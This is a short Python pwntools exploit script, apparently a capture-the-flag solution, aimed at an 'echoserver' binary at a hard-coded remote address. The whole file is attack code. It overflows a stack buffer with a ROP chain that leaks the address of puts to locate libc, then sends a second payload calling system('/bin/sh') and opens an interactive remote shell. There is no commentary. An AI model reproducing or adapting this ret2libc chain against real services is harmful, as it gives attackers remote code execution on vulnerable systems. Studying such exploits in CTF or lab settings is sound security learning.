from pwn import *


debug = 0
if(debug):
	r = process("./echoserver")
	#gdb.attach(r)
else:
	r = remote("125.235.240.166", 20101)

puts_off = 0x00000000000875a0



puts_got = 0x0000000000404018
puts = 0x401030
pop_rdi_ret = 0x00000000004012cb

payload = b'a'*0x88
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts)
payload += p64(0x4011ae)


r.sendline(payload)

r.recv()

r.sendline("QUIT")

r.recvline()
r.recvline()


#print(r.recvline())

stuff = r.recvline().split(b"\n")[0][-6:]

libc = int.from_bytes(stuff, "little") - puts_off

system = libc + 0x000000000055410
binsh = libc + 0x1b75aa

print(hex(libc))


payload = b'a'*0x88
payload += p64(0x0000000000401016)
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)

r.sendline(payload)

r.recvline()

r.sendline("QUIT")

r.interactive()